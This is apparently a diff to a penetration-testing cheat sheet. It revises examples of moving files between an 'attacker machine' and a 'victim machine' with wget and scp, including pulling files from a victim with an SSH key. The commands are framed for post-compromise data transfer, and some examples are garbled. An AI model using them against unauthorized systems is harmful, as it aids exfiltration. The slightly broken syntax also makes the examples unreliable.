@@ -70,15 +70,21 @@ wget -O test.txt http://192.168.1.1:443/test.txt
 Connecting to 192.168.1.1:443 ...
 
 ➤ Command :
-From the attacker machine, upload something on a the victim machine
-root# scp -i ~/.ssh/id_rsa myfile.txt user@10.0.0.1
 
-From the attacker machine, download something from the victim machine
+• From the attacker machine, download something from the victim machine (using password)
+# scp <file_to_download> <username>@<ip>:/<location> <where_to_upload>
 root# scp myfile.txt user@10.0.0.1:/home/user
 user@10.0.0.1's password:
 OR for download a complete repository 
 root# scp myfile.txt user@10.0.0.1:/home/user/* .
 
-From the victim machine, upload something on the attacker machine
+• From the the attacker machine, download something from the victim machine (using ssh key)
+# scp -i <ssh_key>  <username>@<ip>:/<location>/<file> <where_to_upload>
+scp -i sshkey.pem user@10.0.0.1:/home/user/test.txt /tmp/
+
+• From the attacker machine, upload something on a the victim machine
+root# scp -i ~/.ssh/id_rsa myfile.txt user@10.0.0.1
+
+• From the victim machine, upload something on the attacker machine
 scp myfile.txt root@10.0.0.1:/root/ .
 ```
